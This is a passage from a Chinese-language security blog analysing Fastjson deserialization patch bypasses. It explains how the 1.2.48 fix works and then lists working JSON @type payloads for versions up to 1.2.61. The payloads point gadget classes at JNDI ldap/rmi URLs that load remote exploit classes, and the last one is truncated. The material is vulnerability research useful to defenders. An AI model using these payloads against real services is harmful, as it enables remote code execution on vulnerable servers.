![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/clazzBack.png)

### 补丁分析

由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，看看是怎样修的。1.2.48中的修复措施是，在`loadClass()`时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。

调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。

1.2.48版本：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/1248.png)

1.2.47版本：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/1247.png)

导致目标类并不能缓存到Map中了：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/FalseCache.png)

因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用`TypeUtils.getClassFromMapping()`来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：

![img](https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/SuccessFix.png)

## 0x09 Fastjson <= 1.2.61 通杀

### Fastjson1.2.5 <= 1.2.59

**需要开启AutoType**

JAVA

```
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

### Fastjson1.2.5 <= 1.2.60

**需要开启 autoType：**

JAVA

```
{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://10.10.20.166:1099/ExportObject"}

{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://10.10.20.166:1389/ExportObject"}
```

### Fastjson1.2.5 <= 1.2.61

JAVA

```
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploi
```

## 0x10 小结

有点 CTF 那味儿了哈哈

## 参考资料

[Fastjson系列三——历史版本补丁绕过（需开启AutoType） [ Mi1k7ea \]](https://www.mi1k7ea.com/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/)